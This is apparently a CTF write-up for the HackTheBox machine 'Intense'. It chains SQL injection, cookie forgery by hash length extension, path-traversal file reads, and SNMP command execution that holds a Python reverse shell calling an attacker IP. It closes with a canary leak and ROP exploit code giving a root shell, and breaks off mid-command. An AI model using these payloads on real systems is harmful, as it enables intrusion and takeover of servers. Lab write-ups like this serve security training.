---
title: HackTheBox — Intense Writeup
date: 2020-11-14 04:41:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, intense, ctf, linux, code review, code vulnerable, sqli, crack cookies, python, lfi, snmp, shell, exploit, analysis code, buffer overflow, debugging, canary, aslr, rop, privilege escaltion, root]
image: /assets/img/Posts/Intense.png
---
## Reconnaissance

I started with basic `nmap` enumeration.

### Nmap:

```shell
ezi0x00@kali:~~/HTB/Intense$ sudo nmap -sC -sV -O 10.10.10.195
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 00:43 EST
Nmap scan report for 10.10.10.195
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/15%OT=22%CT=1%CU=44554%PV=Y%DS=2%DC=I%G=Y%TM=5FB0C0
OS:38%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=RD%II=I%TS=A)O
OS:PS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BS
OS:T11NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)E
OS:CN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.46 seconds
```
### Summary:

1. Port 80 - HTTP Service 
2. Port 22 -- SSH Service

## Port 80 - HTTP Service 

add it to /etc/hosts to redirect to there:

![website](/assets/img/Posts/webappint.png)

We will notice that this application has an `opensource` that we download and read the code so that we can register as an admin
```shell
ezi0x00@kali:~/HTB/Intense/app$ ls -lah
total 32K
drwx------ 4 ezi0x00 ezi0x00 4.0K Nov 15 01:04 .
drwxr-xr-x 3 ezi0x00 ezi0x00 4.0K Nov 15 01:04 ..
-rw-r--r-- 1 ezi0x00 ezi0x00  813 Nov 10  2019 admin.py
-rw-r--r-- 1 ezi0x00 ezi0x00 2.2K Nov 15  2019 app.py
-rw-r--r-- 1 ezi0x00 ezi0x00 1.4K Nov 16  2019 lwt.py
drwxr-xr-x 6 ezi0x00 ezi0x00 4.0K Sep 11  2019 static
drwxr-xr-x 2 ezi0x00 ezi0x00 4.0K Nov 21  2019 templates
-rw-r--r-- 1 ezi0x00 ezi0x00 2.9K Nov 15  2019 utils.py
```

## Code Review 

This application is made up of `Python Flask Framework`

from `admin.py`   
```
@admin.route("/admin")
def admin_home():
    if not is_admin(request):
        abort(403)
    return render_template("admin.html")
```    
There is an admin panel along with two endpoints to retrieve something.
```
@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''

@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''
```
This admin panel have two parameters `logfile` and `logdir` and  `Method is POST`.

The Admin panel is Forbidden this means that we can’t access it without Admin credentials.
![website](/assets/img/Posts/forb.png)

>I tried to access these endpoints with the given parameters along with Burp in the Guest account, it’s not worked. We need to be an admin to access this feature.

from `app.py`
```
@app.route('/submit', methods=["GET"])
def submit():
    session = get_session(request)
    if session:
        user = get_user(session["username"], session["secret"])
        return render_template("submit.html", page="submit", user=user)
    return render_template("submit.html", page="submit")
```
The session is the cookie here and it is composed of two parts. One is the name of the user and another one is secret.
```
@app.route("/submitmessage", methods=["POST"])
def submitmessage():
    message = request.form.get("message", '')
    if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
    # insert new message in DB
    try:
        query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
        return str(e)
    return "OK"
```
Database is `SQLite`
There are two restrictions in sending messages. In the `Submit` form, the message must be no more than 140 characters long, and some words are prohibited.
and here we found vulnerable sqlite request:
```
new_msg= "insert into messages values ('%s')" % message
```
let's continue and we will back again.

from `lwt.py`    
```
from hashlib import sha256
from base64 import b64decode, b64encode
from random import randrange
import os

SECRET = os.urandom(randrange(8, 15))


class InvalidSignature(Exception):
    pass


def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()
```
This part responsible for `Hashing`. have two mission design sessions key also verifying the message.
```
def parse_session(cookie):
    """ Parse cookie and return dict
        @cookie: "key1=value1;key2=value2"

        return {"key1":"value1","key2":"value2"}
    """
    b64_data, b64_sig = cookie.split('.')
    data = b64decode(b64_data)
    sig = b64decode(b64_sig)
    if not verif_signature(data, sig):
        raise InvalidSignature
    info = {}
    for group in data.split(b';'):
        try:
            if not group:
                continue
            key, val = group.split(b'=')
            info[key.decode()] = val
        except Exception:
            continue
    return info
```
Here `sig` is `signature` key and `data` is known for the `username`. These all are encoded in `base64` and separated by a `"."`. 
So this is a shape of cookie.

from `utils.py`

This script shows us how the database works
```
def is_admin(request):
    session = get_session(request)
    if not session:
        return None
    if "username" not in session or "secret" not in session:
        return None
    user = get_user(session["username"], session["secret"])
    return user.role == 1
```
The role of the admin is `1`
```
def admin_view_log(filename):
    if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()


def admin_list_log(logdir):
    if not path.exists(f"logs/{logdir}"):
        return f"Can't find {logdir}"
    return listdir(logdir)
```
The `secrets` we want in the `/admin/log`. 
To get this, we need to become the `Admin`, 
What I understood from the powers of the admin, and we will refer to it in detail again. two admin route which could allows us perform a directory traversal attack and read files from the box.

let's first examine the guest cookies and whether we can modify them to become addictive or not, because as we noticed in the code that cookies are placed in a specific way, the name and the secret, and separating them by `.`

we will use `Cookie-Editor`

![website](/assets/img/Posts/cookieint.png)
Cookie Editor gave us the cookie of the guest. As you can see, the cookie’s attribute is named as auth and that is being verified on the backend parameter too. Let’s copy this string to our terminal to further understanding.
```shell
ezi0x00@kali:~/HTB/Intense$ nano cookie.py 
ezi0x00@kali:~/HTB/Intense$ cat cookie.py
from base64 import *
cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Pa7nW7aHjP+YPW5avOfc78MHKz6x+AuFtKMOGHanePY="
user_guest, secret_guest = cookie.split(".")
cookie_guest = b64decode(user_guest) + b64decode(secret_guest)
print cookie_guest
ezi0x00@kali:~/HTB/Intense$ python cookie.py
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;=��[�����=nZ�����+>��
                                                                                                            ���▒v�x�
```
we got is a username, a secret string, and also an unreadable data. Its time to back to `SQLI` on the `Submit` page.

I used this [**List**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md), cause this app used `SQLite`
first output:
```
near "–": syntax error
```
Using the MATCH function along with CASE THEN, if the secret of user match for role 1

Payload:
`"'AND (SELECT CASE WHEN ((SELECT substr(secret,"+str(i+1)+",1) FROM users WHERE role=1) = '"+c+"') THEN 1 ELSE MATCH(1,1) END))  --"'`

![website](/assets/img/Posts/sqlint.png)
With sql listing request, i can't return any Db information, that's mean this function can’t match the exact length of the `secret` string for the user who has role 1 that is Admin. but i can do an injection by guessing admin secret through return message.

after search i found that we can bruteforce password using `substr()` function.
when we decode the guest cookie we found The length of `Guest’s secret` is 64 means that we need to loop through the `SQLi` until we get 64. So along with my friend, I made a python [**script**](https://github/0xN1ghtR1ngs) to bruteforce it.

and here the admin cookie: 
```
The password length is : 64
The password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
```
It's sha256 hash, we need to crack it.
From the source code we see that this signature is an sha256(data+RANDOM_KEY) concatenated to the base64 user. 
I've looked for a long time for how we can crack this hash and i found this [**article**](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks), and i made [**script**](https://github.com/0xN1ghtR1ngs) to do this mission.

and here we did it :"D
```
The cookie : auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.IQobfpRfcEVJCrr8BxQ+IeLy7wRbwHkJV3EZt3ehmpY=   
The lenght :11
```
try it by edit cookie in browser.
![website](/assets/img/Posts/logincookieadmin.png)

if you remember source code review from the app code source we have two routes in admin section, `logfile`,`logdir`

To have access we have to send a post request with the parameter "logfile" for the route "admin/log/view" and post a filename param `logfile=../../etc/passwd`
```
@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''


@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''
```
result:
![website](/assets/img/Posts/burperes.png)
So we don't need a shell to get `user flag` we got a `LFI` so just insert `logfile=../../../../../../../../../../../../home/user/user.txt`
![website](/assets/img/Posts/lfiuserflag.png)

## Shell

When we saw `passwd`, i noticed there are `snmp`
![website](/assets/img/Posts/snmppasswd.png)
>Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. 

let's read the file configuration maybe we get a credentials.
![website](/assets/img/Posts/snmpdconf.png)

here some info is very useful
```
 rocommunity public  default    -V systemonly
 rwcommunity SuP3RPrivCom90
```
to get `RCE` i read this [**article**](https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e)

An abbreviation of the article and time:
First, we need make a string to inject my commands inside the snmpd.conf file, So we put a reverse shell command into the `NET-SNMP-EXTEND-MIB` object , and execute it with `snmwalk`
```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 \     
    10.10.10.195 \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /usr/bin/python3 \
    'nsExtendArgs."command"'    = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.16.x\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash")"'
```    
Then, run the above `snmpwalk` command to find out the ISO where the “Hello World” is executing.
```
snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195
```
Using all of this manually is very difficult and you will face many problems with that i used this [**tool**](https://github.com/mxrch/snmp-shell) to automate all this process.
```shell
ezi0x00@kali:~/HTB/Intense/snmp-shell$ rlwrap python3 shell.py 10.10.10.195 -c SuP3RPrivCom90

Debian-snmp@intense:/$ id 
uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
```
After got a shell.

![website](/assets/img/Posts/bedan.jpeg)

## Privilege Escaltion

```shell
Debian-snmp@intense:/home/user$ ls
note_server
note_server.c
user.txt
```
I found `note_server` and the source code of this server. I was suspicious that it might be a buff overflow, but in pentest, no guess. Here the most important thing is the `enumeration`.
So if it server let's see what's running in machine 
```shell
Debian-snmp@intense:/home/user$ netstat -lapute | grep -i root
(No info could be read for "-p": geteuid()=111 but you should be root.)
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      root       27635      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      root       29885      -                   
tcp        0      0 localhost:5001          0.0.0.0:*               LISTEN      root       26459      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      root       29896      -                   
udp        0      0 0.0.0.0:51290           0.0.0.0:*                           root       27543      -                   
udp        0      0 0.0.0.0:snmp            0.0.0.0:*                           root       27545      -  
```
The server running as root on port 5001. and we have the source code of the server, let's analysis

from `note_server.c`
let's see main function
```
int main( int argc, char *argv[] ) {
    int sockfd, newsockfd, portno;
    unsigned int clilen;
    struct sockaddr_in serv_addr, cli_addr;
    int pid;

    /* ignore SIGCHLD, prevent zombies */
    struct sigaction sigchld_action = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_NOCLDWAIT
    };
    sigaction(SIGCHLD, &sigchld_action, NULL);

    /* First call to socket() function */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
        perror("setsockopt(SO_REUSEADDR) failed");

    /* Initialize socket structure */ 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = 5001;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_port = htons(portno);

    /* Now bind the host address using bind() call.*/
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("ERROR on binding");
        exit(1);
    }
```
main function use the socket and wait for a client to connect. 
```
while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

        if (newsockfd < 0) {
            perror("ERROR on accept");
            exit(1);
        }

        /* Create child process */
        pid = fork();

        if (pid < 0) {
            perror("ERROR on fork");
            exit(1);
        }

        if (pid == 0) {
            /* This is the client process */
            close(sockfd);
            handle_client(newsockfd);
            exit(0);
        }
        else {
            close(newsockfd);
        }
```
The server create a child process with fork() this process will handle the client request.

`void handle_client(int sock)` this function use 3 cases 
1. read from client command buffer and put into the note array
2. copy data from an offset of the note array to an other offset `index` in the same array
3. write the content of the note array
and the buffer size is `1024`, and it's problem it will make `buff overflow`.

let's check executable file 
```shell
ezi0x00@kali:~/HTB/Intense$ checksec --file=note_server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79) Symbols       No    0               2               note_server
```
there are `canary protection`, so when we do `BOF`, canary will detect stack smash 	

this will be a simple ROP exploit, where I chain together gadgets, or small snippets of code that each move one or two pieces into place and return to the next one. To do this I'll need some gadgets. I'll also need a way to leak the canary, as well as the address space for the program, since PIE is enabled.
**To prevent from the canary reuse with fork(). Use execve() after the fork(), sections "text" "data" and "bss" will change the memory and use a new random canary value.**

With radare2 we can see the code where the random 8bytes canary is stored just on top of the stack and any buffer overflow trying to overwite the return address,  wil modify the canary QWORD before.
Here is the code before the ret which will verify if the content of this QWORD is the same as the one created by the binary in the execution.

```
The code :
││ │╎   0x55f984d95de6      488b45f8       mov rax, qword [var_8h]
│   ││ │╎   0x55f984d95dea      644833042528.  xor rax, qword fs:[0x28]
│   ││┌───< 0x55f984d95df3      740c           je 0x55f984d95e01
│  ┌──────< 0x55f984d95df5      eb05           jmp 0x55f984d95dfc
│  ││││││   ; CODE XREFS from sym.handle_client @ 0x55f984d95ce7, 0x55f984d95dc5
│  │└└─└└─< 0x55f984d95df7      e9d3fdffff     jmp 0x55f984d95bcf
│  │  │     ; CODE XREF from sym.handle_client @ 0x55f984d95df5
│  └──────> 0x55f984d95dfc      e88ffbffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│     └───> 0x55f984d95e01      c9             leave
└           0x55f984d95e02      c3             ret
```

Binary compare the canary block from var_8h which "rbp-0x8" with the constant value of canary "fs:[0x28]"
After the xor of the two QWORDS "rax" and "fs:[0x28]" it will jmp to the end of function to leave, or call the function "imp.__stack_chk_fail"

Find the offset where the canary begin: 

We can't directly write over the buffer, but we have to put the data into the note array. First through the command 1 and use the command 2 to define the offset from where we will write over the buffer.
I create a "pattern_offset" with gdb, and put it in the notes[512] offset= 512, and put a breakpoint and read the "rbp-0x8" to find the location of the offset before the canary QWORD.
I used gdb with (peda configuration) to debug this forked process.  like: 

Note: 
>To run gdb for something like this, I'll want to have follow-fork-mode child as I already saw that the server will fork the processing into a new process. I'll also want to set detach-on-fork off so that I don't have to constantly restart gdb. I did this by dropping those two into my ~/.gdbinit file, along with peda. 

```shell
ezi0x00@kali:~/HTB/Intense$ cat ~/.gdbinit
source ~/peda/peda.py
set follow-fork-mode child
set detach-on-fork off
```

Next, start the binary on it's own, and then attach to it with gdb using the -p [pid] option. It will then run up to the accept call and break, since that's where the program is waiting for input. Once a child thread completes, I'll just run inferiors 1 to go back to the main thread. Sometimes things get screwed up, and I'll just restart gdb.

```shell
ezi0x00@kali:~/HTB/Intense$ gdb - p pid
```

```
0x555555554de6 <handle_client+588>:	mov    rax,QWORD PTR [rbp-0x8]
   0x555555554dea <handle_client+592>:	xor    rax,QWORD PTR fs:0x28
   0x555555554df3 <handle_client+601>:	je     0x555555554e01 <handle_client+615>
   0x555555554df5 <handle_client+603>:	jmp    0x555555554dfc <handle_client+610>
   0x555555554df7 <handle_client+605>:	jmp    0x555555554bcf <handle_client+53>


$ gdb-peda$ break *handle_client+588
$ gdb-peda$ show follow-fork-mode             (to follow any created fork process,if not already puted into .gdbinit)
$ run
 
gdb-peda$ pattern_create 255
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%'


gdb-peda$ x/3xg $rbp-0x8 
0x7fffffff8fb8:	0x6e41412441414241	0x41412d4141434141
0x7fffffff8fc8:	0x413b414144414128
```

Here we have the content of '$rbp-0x8' where the canary is stored. And with gdb we can found how much offset before this address:

```
gdb-peda$ pattern_offset 0x6e41412441414241
7944702841627689537 found at offset: 8
```

>The canary start after 8 bytes. 


Read canary EBP and the return address 

The function used to copy a note into in other offest is "memcpy":

```
void *memcpy(void *dest, const void * src, size_t n)
```

This function dosen't verify the presence of "\x00" end of string. and so we can put "\x00" in the payload and the function will continue copying.
The first canary byte is always "\x00" to block any payload using a functions like "scanf()" etc which stop reading when find the "\x00".
With the first test to know how much bytes to reach the canary block we caught 8 bytes.

```
 => |          Buffer                   |          8 bytes junk        |         8 Bytes of canary    |           8 Bytes RBP            |         8 Bytes Return Address   |
```

- We place index at the end of buffer(put 1024 bytes into notes[])
- With CMD2 we put the offset at 1024 too and tell "memcpy()" to copy 32 bytes which represent the 4 qword (qword == 64bits == 8bytes), and add 32 to index(index+=32)
- We  overrite the buffer but we copy the same value, because "dest" and "src" offset are the same, so we overwite without throw a  smach stack error. 
- Using the CMD3, we can write the note buffer(send to client), and read the buffer + 32bytes after the buffer (canary,EBP,RIP)

Code

```
def read_canary_ebp_rsp():
    payload_fullbuff= put_payload_into_notebuffer()

    #Now index =1024, let's use CMD2 and define offset as 1024 and use memcpy() to copy the canary rbp and rsp into the end of the node[]
    payload_bof =copy_to_note(1024,32)    
    # send the two payload and read the three registers
    p = remote(args.ip,args.port)
    p.send(payload_fullbuff)  # send the payload to put all in the note buffer
    p.send(payload_bof)   # throw bof wiht cmd2

    data= p.recv()
    canary=u64(data[1024+8:1024+16])
    RBP=u64(data[1024+16:1024+24])
    RIP=u64(data[1024+24:1024+32])
    
    canary_formated = binascii.hexlify(struct.pack(">Q",canary)).decode() # fromated address to little endian and in hexa form 
    RBP_formated = binascii.hexlify(struct.pack(">Q",RBP)).decode() # fromated address to little endian and in hexa form 
    RIP_formated = binascii.hexlify(struct.pack(">Q",RIP)).decode() # fromated address to little endian and in hexa form 

    print(colored("Canary: 0x%s "%canary_formated,"green"))
    print(colored("RBP:    0x%s "%RBP_formated,"green"))
    print(colored("RIP:    0X%s "%RIP_formated,"green"))
    p.close()
    return (canary,RBP,RIP)
```

Leak libc 

Now I know the memory space of the main program, but not the libc. I also know the canary and can overwrite the return address. I'll use a rop chain to leak a libc address, and then can calculate the addresses of any functions or strings in libc I want. In the program, it uses "write" to send data to the socket. I'll use a write call to send the GOT table address for the write function.

Program base Address:

Because PIE is enabled it means that even if my gadgets are in the main program, they still move around in memory.
I'll use my leaked return address (RIP) to find the offset of the program base. The return address I leak will always be as the same distance from the base into that memory space. So I can simply look at that address and the memory map, and calculate the offset.

```
gdb-peda$ x/3xg $rbp-0x8
0x7fffffff8fb8:	0xd0fe47edd3651300	0x00007fffffff90c0
0x7fffffff8fc8:	0X0000555555554f54
gdb-peda$ info proc mappings
process 31711
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555556000     0x2000        0x0 /Lab/htb/Intense/note_server
      0x555555755000     0x555555756000     0x1000     0x1000 /Lab/htb/Intense/note_server
      0x555555756000     0x555555757000     0x1000     0x2000 /Lab/htb/Intense/note_server
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7dd7000     0x7ffff7df9000    0x22000        0x0 /lib/x86_64-linux-gnu/libc-2.28.so
gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
$3 = 0xf54
```

Here our return address is **0X0000555555554f54** and the and base address of program is  **0x555555554000** so the offset  **0xf54**  And because that offset is always the same. I can calculate for any run that the base address will be the leaked return address minus **0xf54**


```
base_address = rip - 0xf54 # 0x caught with the (rip - base addresse) For base address gdb-peda$ vmmap and   gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
```

Get Gadgets:

I'll need gadgets that allow me to set rdi, rsi, and rdx, as well as the GOT address for write to leak, and the PLT address for write to call. I'll get gadgets by typing rop at the gdb-peda$ prompt:

Firstly i tried to get gadgets using the python pwntools ROP class like:

```
def read_write_libc_fct_address(binary,canary,rbp,base_address):

   elf= ELF(binary, checksec=False)
   elf.address = base_address
   rop = ROP(elf)
   # create the rop gadgets representing : write(file_descriptot=4,write@GOT())  file_descriptor = 4 ( our client )
   rop.write(FILE_DESCRIPTOR,elf.got['write'])
   log.info('stage 1 ROP Chain :' + rop.dump())
   len_rop=len(rop.chain())
   ## try got write
   payload_fullbuff=put_payload_into_notebuffer(canary,rbp,rop.chain(),False)

   #Now index =1024, let's use CMD2 and define offset as 4 and use memcpy() to copy the canary rbp and rop into the end of the node[]
   copy_size = 8+16+len_rop # the size of buffer to cpy
   payload_bof =copy_to_note(4,copy_size)

   # send to payload
   p = remote(args.ip,args.port)
   p.send(payload_fullbuff)  # send the payload to put all in the note buffer
   p.send(payload_bof)   # throw bof wiht cmd2
   # read the first buffer+copying data over the buffer
   data= p.recv(1024+copy_size)

   print(colored("Data Length %s"%len(data),"green"))
   #print(colored("Data: %s"%binascii.hexlify(data),"green"))
   write_libc_address = p.recv(8,timeout=4) # read the write() address with the rop chains. its the write address from Libc
   write_libc_address_formed =struct.pack(">Q",u64(write_libc_address))
   print(colored("write_plt_address Length %s"%len(write_libc_address),"green"))
   print(colored("write_plt_address: 0x%s  "%binascii.hexlify(write_libc_address_formed).decode(),"green"))
   p.close()
   return u64(write_libc_address)

```

The GOT address will hold the address of "write" in libc as it's loaded. That's what I want to leak. The PLT is the table of code that contains the stubs to call the dynamic linker. So the first time a function is called, the GOT jump right back to the PLT which calls the linker. The linker updates the GOT so the next time it's called, it goes right to the function in libc. The PLT address will be constant relative to the program base. I finally have to find the offset of functions and gadgets etc.. and calculate the libc base address.

```
	     # readelf -s remote_libc.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"
              #999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
              #1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
              #2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5


	     # strings -a -t x remote_libc.so | grep -i "/bin/sh"
		# 1b3e9a /bin/sh

	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdi "
	       # 0x0002155f: pop rdi ; ret  ;  (490 found)

	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rsi"
	       # 0x00023e6a: pop rsi ; ret  ;  (147 found)

	    #  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdx"
	       # 0x00001b96: pop rdx ; ret  ;  (6 found)

	       write_offset_libc= 0x0000000000110140
	       dup2_offset_libc = 0x00000000001109a0
	       execve_offset_libc = 0x00000000000e4e30
	       binsh_offset_libc =  0x1b3e9a
	       pop_rdi_ret_offset = 0x0002155f
	       pop_rsi_ret_offset = 0x00023e6a
	       pop_rdx_ret_offset = 0x00001b96

	       libc_base = write_libc_address - write_offset_libc
	       dup2_address = p64(dup2_offset_libc + libc_base)
	       execve_address = p64(execve_offset_libc+libc_base)
	       binsh_address = p64(binsh_offset_libc+libc_base)   
	       pop_rdi_ret_address = p64(pop_rdi_ret_offset +libc_base)
	       pop_rsi_ret_address = p64(pop_rsi_ret_offset +libc_base)
	       pop_rdx_ret_address = p64(pop_rdx_ret_offset +libc_base)
```

Putting all of that together, i have the following code:

Note: 

>When we execute the shell with "execve("/bin/sh",0,0)" function we have to redirect the output(stdout), the input(stdin) and the error(stderr) to the client file descriptor socket.

The file descriptor number for the client where the reverse shell should redirect the (stdin,stdout,sterror)
```
  0x0000555555554de8 <+654>:	movzx  edx,WORD PTR [rbp-0x412]
   0x0000555555554def <+661>:	lea    rcx,[rbp-0x410]
   0x0000555555554e29 <+655>:	mov    eax,DWORD PTR [rbp-0x424]
   0x0000555555554e2f <+661>:	mov    rsi,rcx
   0x0000555555554e32 <+664>:	mov    edi,eax
   0x0000555555554e34 <+666>:	call   0x555555554980 <write@plt>
```

Here the sock == file descriptor is the first argument of the function "write(sock,note,index)". This argument is passed through the edi, and edi is the value of 'DWORD PTR [rbp-0x424]"

**edi is 4bytes from [rbp-0x424]**

```
gdb-peda$ x/4b $rbp-0x424
0x7fffffff8b9c:	0x04	0x00	0x00	0x00
```

```
  # create payloads
       # first rop chains to execute: dup2(FILE_DESCRIPTOR,1) 
       # in asm:
        #pop rdi, ret # set the arg1 (File_DESCRIPTOR==4)
        #pop rsi, ret # set arg2      (stdout=1)
        #call dup2(4,1) redirect stout
       payload_dup2=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(1)
       payload_dup2+=dup2_address
        #call dup2(4,0) redirect stdin
       payload_dup2+=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(0)
       payload_dup2+=dup2_address
        #call dup2(4,2) redirect stderror
       payload_dup2+=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(2)
       payload_dup2+=dup2_address
       
       # second ropchains to execve("/bin/sh",0,0)
       # in asm:
        #pop rdi, ret # set the arg1 ("/bin/sh" address)
        #pop rsi, ret # set arg2      (0)
        #pop rdx, ret # set arg3      (0)
        #call execve
       payload_execve=pop_rdi_ret_address
       payload_execve+=binsh_address
       payload_execve+=pop_rsi_ret_address
       payload_execve+=p64(0)
       payload_execve+=pop_rdx_ret_address
       payload_execve+=p64(0)
       payload_execve+=execve_address
       # Final payload
       final_payload= payload_dup2 +payload_execve
```

I created a python script which exploit the binary locally using the same binary with same debugging modification, and the local libc, and also with the remote binary.

Note:
>The server run locally so i had to use chisel to forward the port 5001, in my machine :

```
ezi0x00@kali:~/HTB/Intense$ ./chisel client --max-retry-count 1  10.10.14.X:8000 R:5001:127.0.0.1:5001
```
And i can see the port 5001 listening  in my machine :

```
ezi0x00@kali:~/HTB/Intense$ lsof -ni :5001         
